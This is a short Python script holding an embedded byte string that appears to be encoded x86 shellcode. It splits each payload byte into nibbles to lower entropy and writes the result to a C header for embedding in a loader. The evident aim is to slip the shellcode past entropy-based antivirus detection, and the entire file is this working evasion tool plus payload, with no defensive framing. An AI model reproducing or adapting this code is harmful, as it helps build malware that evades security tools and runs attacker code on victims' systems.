# f = open("payloadbytes", "rb")
# payload = f.read()
# f.close()

payload = b"""\x6a\x30\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13
\xf4\xdd\xb5\xba\x83\xeb\xfc\xe2\xf4\x08\x35\x37\xba
\xf4\xdd\xd5\x33\x11\xec\x75\xde\x7f\x8d\x85\x31\xa6
\xd1\x3e\xe8\xe0\x56\xc7\x92\xfb\x6a\xff\x9c\xc5\x22
\x19\x86\x95\xa1\xb7\x96\xd4\x1c\x7a\xb7\xf5\x1a\x57
\x48\xa6\x8a\x3e\xe8\xe4\x56\xff\x86\x7f\x91\xa4\xc2
\x17\x95\xb4\x6b\xa5\x56\xec\x9a\xf5\x0e\x3e\xf3\xec
\x3e\x8f\xf3\x7f\xe9\x3e\xbb\x22\xec\x4a\x16\x35\x12
\xb8\xbb\x33\xe5\x55\xcf\x02\xde\xc8\x42\xcf\xa0\x91
\xcf\x10\x85\x3e\xe2\xd0\xdc\x66\xdc\x7f\xd1\xfe\x31
\xac\xc1\xb4\x69\x7f\xd9\x3e\xbb\x24\x54\xf1\x9e\xd0
\x86\xee\xdb\xad\x87\xe4\x45\x14\x82\xea\xe0\x7f\xcf
\x5e\x37\xa9\xb7\xb4\x37\x71\x6f\xb5\xba\xf4\x8d\xdd
\x8b\x7f\xb2\x32\x45\x21\x66\x4b\xb4\xc6\x37\xdd\x1c
\x61\x60\x28\x45\x21\xe1\xb3\xc6\xfe\x5d\x4e\x5a\x81
\xd8\x0e\xfd\xe7\xaf\xda\xd0\xf4\x8e\x4a\x6f\x97\xbc
\xd9\xd9\xf4\xdd\xb5\xba"""

newpayload = [0 for i in range(len(payload) * 2)]
payloadsize = len(payload)
for i in range(payloadsize):
    newpayload[i] = payload[i] & 0xf
    newpayload[i  + payloadsize] = (payload[i] & 0xf0)>> 4
f = open("low-entropy-payload.h", "w")
f.write("unsigned char embeded_payload[] = \n")
for i in range(0, payloadsize * 2, 14):
    f.write("\"")
    for j in range(i, i + 14):
        if j >= len(payload) *2:
            continue
        f.write("\\x")
        f.write(hex(newpayload[j])[2:].rjust(2, "0"))
    f.write("\"\n")
f.write(";")
f.write(f"int BUFFER_Size = {payloadsize};")
f.close()